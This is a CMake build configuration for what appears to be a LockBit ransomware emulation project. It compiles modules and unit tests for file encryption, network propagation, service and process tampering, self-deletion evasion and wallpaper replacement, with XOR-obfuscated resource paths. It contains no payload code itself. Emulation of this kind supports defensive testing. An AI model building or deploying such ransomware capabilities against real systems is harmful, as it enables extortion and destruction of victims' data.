# Set compiler flags
if ("${CMAKE_CXX_COMPILER_ID}" STREQUAL "MSVC")
    set(CMAKE_CXX_FLAGS  "${CMAKE_CXX_FLAGS} /O2")
else()
set(CMAKE_CXX_FLAGS  "${CMAKE_CXX_FLAGS} -O")
endif()

# Build components
add_subdirectory("self_del_helper")
add_subdirectory("lockbit_main")
add_subdirectory("lockbit_minimal")

###############################################################################
# Unit test source files
###############################################################################
target_sources(
    lockbit-test
    PRIVATE
    "common/config/config_test.cpp"
    "common/crypto/encryption_test.cpp"
    "common/enumerate_test.cpp"
    "common/impact/encryption_test.cpp"
    "common/impact/impact_test.cpp"
    "common/util/argparser_test.cpp"
    "common/util/base64_test.cpp"
    "common/util/registry_test.cpp"
    "common/util/test_utils.cpp"
    "common/util/threadpool_test.cpp"
    "common/util/util_test.cpp"
    "lockbit_main/discovery_test.cpp"
    "lockbit_main/execute_test.cpp"
    "lockbit_main/guardrails/lang_test.cpp"
    "lockbit_main/guardrails/mutex_test.cpp"
    "lockbit_main/propagate/ping_test.cpp"
    "lockbit_main/propagate/local_ips_test.cpp"
    "lockbit_main/propagate/propagate_test.cpp"
    "lockbit_main/tamper/proc_test.cpp"
    "lockbit_main/tamper/svc_test.cpp"
    "self_del_helper/self_del_test.cpp"

    "common/config/unit_test_config.rc"
    "common/impact/icon.rc"
    "common/impact/wallpaper.rc"
    "lockbit_main/def_evasion/self_del.rc"
)

target_compile_definitions(
    lockbit-test
    PRIVATE
    UNIT_TEST_CONFIG_PATH="${UnitTestConfigResourcePathXor}"
    FILE_ICON_PATH="${IconResourcePathXor}"
    WALLPAPER_PATH="${WallpaperResourcePathXor}"
    SELF_DEL_EXE_PATH="$<TARGET_FILE:self-delete>.xor"
    $<$<CONFIG:Debug>:DEBUG>
)
